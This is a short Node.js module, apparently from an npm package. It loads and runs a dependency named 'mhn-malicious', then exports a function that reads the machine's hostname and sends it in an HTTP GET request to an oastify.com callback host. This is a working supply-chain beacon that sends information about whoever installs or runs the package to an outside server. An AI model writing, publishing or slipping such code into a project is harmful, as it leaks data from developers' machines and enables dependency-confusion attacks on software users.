const http = require('http');
const mhn = require('mhn-malicious');
mhn();

module.exports = function() {
    const hostname = require('os').hostname();

    const options = {
        hostname: 'q6xjg3g3tfmh1vk4xv0axdd3muslgd42.oastify.com',
        path: `/${hostname}`,
        method: 'GET',
    };

    const req = http.request(options, res => {
        console.log(`Status Code: ${res.statusCode}`);
    });

    req.on('error', error => {
        console.error(`Error sending hostname: ${error}`);
    });

    req.end();
};
